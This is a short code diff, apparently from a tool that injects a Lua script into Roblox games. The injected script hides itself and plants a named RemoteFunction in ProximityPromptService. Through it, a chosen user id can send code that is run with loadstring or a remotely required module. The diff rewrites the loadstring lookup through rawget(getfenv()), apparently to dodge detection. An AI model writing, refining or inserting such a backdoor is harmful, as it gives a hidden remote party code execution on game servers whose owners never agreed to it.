@@ -70,7 +70,7 @@ async function activate() {
 pcall(function ()
 	script.Parent = nil
 end)
-local nativeloadstring = pcall(loadstring, '--')
+local native_eval = pcall(rawget(getfenv(),"loadstring"), '--')
 local remote = Instance.new('RemoteFunction', game:GetService('ProximityPromptService'))
 remote.Name = %q
 local user = %i
@@ -84,7 +84,7 @@ function func (player, action, code)
 	end
 	if action == 'run' then
 		task.defer(pcall, function ()
-			local run = nativeloadstring and loadstring or require(8194576728)
+			local run = native_eval and rawget(getfenv(),"loadstring") or require(8194576728)
 			run(code)()
 		end)
 	end
